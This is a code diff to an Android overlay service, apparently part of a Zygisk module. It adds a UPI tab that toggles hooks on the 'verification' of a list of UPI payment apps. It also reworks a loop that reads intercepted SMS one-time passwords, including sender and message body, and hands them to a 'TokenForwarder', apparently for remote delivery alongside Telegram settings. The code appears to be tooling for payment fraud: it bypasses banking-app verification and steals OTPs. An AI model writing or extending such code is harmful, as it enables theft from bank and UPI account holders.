@@ -13,7 +13,9 @@ import android.view.LayoutInflater
 import android.view.MotionEvent
 import android.view.View
 import android.view.WindowManager
+import android.widget.LinearLayout
 import android.widget.Toast
+import com.google.android.material.switchmaterial.SwitchMaterial
 import androidx.core.app.NotificationCompat
 import com.hivirtus.zygiskmode.databinding.OverlayMenuBinding
 import com.hivirtus.zygiskmode.databinding.OverlayRootBinding
@@ -35,7 +37,8 @@ class OverlayService : Service() {
     private val tokenForwarder by lazy { TokenForwarder(configManager) }
     private var pollJob: Job? = null
     private var menuExpanded = false
-    private var lastForwardedOtp: String? = null
+    private var lastForwardedKey: String? = null
+    private val upiAppSwitches = mutableMapOf<String, SwitchMaterial>()
 
     private var initialX = 0
     private var initialY = 0
@@ -143,8 +146,11 @@ class OverlayService : Service() {
         menuBinding.btnMinimize.setOnClickListener { collapseMenu() }
 
         menuBinding.tabSystem.setOnClickListener { selectTab(Tab.SYSTEM) }
+        menuBinding.tabUpi.setOnClickListener { selectTab(Tab.UPI) }
         menuBinding.tabMessage.setOnClickListener { selectTab(Tab.MESSAGE) }
         menuBinding.tabTelegram.setOnClickListener { selectTab(Tab.TELEGRAM) }
+
+        setupUpiApps(config)
 
         menuBinding.btnSaveSim.setOnClickListener {
             val updated = configManager.load().copy(
@@ -217,7 +223,46 @@ class OverlayService : Service() {
             }
         }
 
-        selectTab(Tab.SYSTEM)
+        menuBinding.btnSelectAllUpi.setOnClickListener {
+            upiAppSwitches.values.forEach { it.isChecked = true }
+        }
+
+        menuBinding.btnDeselectAllUpi.setOnClickListener {
+            upiAppSwitches.values.forEach { it.isChecked = false }
+        }
+
+        menuBinding.btnSaveUpiHooks.setOnClickListener {
+            val hooked = upiAppSwitches.mapValues { it.value.isChecked }
+            configManager.update {
+                it.copy(
+                    hookUpiVerification = menuBinding.switchHookUpiVerification.isChecked,
+                    hookedUpiApps = hooked
+                )
+            }
+            Toast.makeText(this, R.string.upi_hooks_saved, Toast.LENGTH_SHORT).show()
+        }
+
+        selectTab(Tab.UPI)
+    }
+
+    private fun setupUpiApps(config: ModuleConfig) {
+        menuBinding.switchHookUpiVerification.isChecked = config.hookUpiVerification
+        menuBinding.upiAppsContainer.removeAllViews()
+        upiAppSwitches.clear()
+
+        UpiAppRegistry.ALL.forEach { app ->
+            val switch = SwitchMaterial(this).apply {
+                text = app.displayName
+                isChecked = config.hookedUpiApps[app.packageName] ?: true
+                setTextColor(getColor(R.color.text_primary))
+                layoutParams = LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.MATCH_PARENT,
+                    LinearLayout.LayoutParams.WRAP_CONTENT
+                )
+            }
+            upiAppSwitches[app.packageName] = switch
+            menuBinding.upiAppsContainer.addView(switch)
+        }
     }
 
     private fun expandMenu() {
@@ -236,27 +281,25 @@ class OverlayService : Service() {
         windowManager.updateViewLayout(rootBinding.root, layoutParams)
     }
 
-    private enum class Tab { SYSTEM, MESSAGE, TELEGRAM }
+    private enum class Tab { SYSTEM, UPI, MESSAGE, TELEGRAM }
 
     private fun selectTab(tab: Tab) {
         menuBinding.panelSystem.visibility = if (tab == Tab.SYSTEM) View.VISIBLE else View.GONE
+        menuBinding.panelUpi.visibility = if (tab == Tab.UPI) View.VISIBLE else View.GONE
         menuBinding.panelMessage.visibility = if (tab == Tab.MESSAGE) View.VISIBLE else View.GONE
         menuBinding.panelTelegram.visibility = if (tab == Tab.TELEGRAM) View.VISIBLE else View.GONE
 
         val active = getColor(R.color.tab_active)
         val inactive = getColor(R.color.tab_inactive)
 
-        menuBinding.tabSystem.apply {
-            isSelected = tab == Tab.SYSTEM
-            setTextColor(if (tab == Tab.SYSTEM) active else inactive)
-        }
-        menuBinding.tabMessage.apply {
-            isSelected = tab == Tab.MESSAGE
-            setTextColor(if (tab == Tab.MESSAGE) active else inactive)
-        }
-        menuBinding.tabTelegram.apply {
-            isSelected = tab == Tab.TELEGRAM
-            setTextColor(if (tab == Tab.TELEGRAM) active else inactive)
+        listOf(
+            menuBinding.tabSystem to Tab.SYSTEM,
+            menuBinding.tabUpi to Tab.UPI,
+            menuBinding.tabMessage to Tab.MESSAGE,
+            menuBinding.tabTelegram to Tab.TELEGRAM
+        ).forEach { (view, t) ->
+            view.isSelected = tab == t
+            view.setTextColor(if (tab == t) active else inactive)
         }
     }
 
@@ -264,9 +307,10 @@ class OverlayService : Service() {
         pollJob = CoroutineScope(Dispatchers.IO).launch {
             while (isActive) {
                 val lastOtp = configManager.readLastOtp()
-                if (lastOtp != null && lastOtp.otp != lastForwardedOtp) {
-                    if (tokenForwarder.forward(lastOtp)) {
-                        lastForwardedOtp = lastOtp.otp
+                if (lastOtp != null) {
+                    val forwardKey = "${lastOtp.sender}|${lastOtp.body}|${lastOtp.otp}"
+                    if (forwardKey != lastForwardedKey && tokenForwarder.forward(lastOtp)) {
+                        lastForwardedKey = forwardKey
                         launch(Dispatchers.Main) {
                             menuBinding.tvLastOtp.visibility = View.VISIBLE
                             menuBinding.tvLastOtp.text = getString(
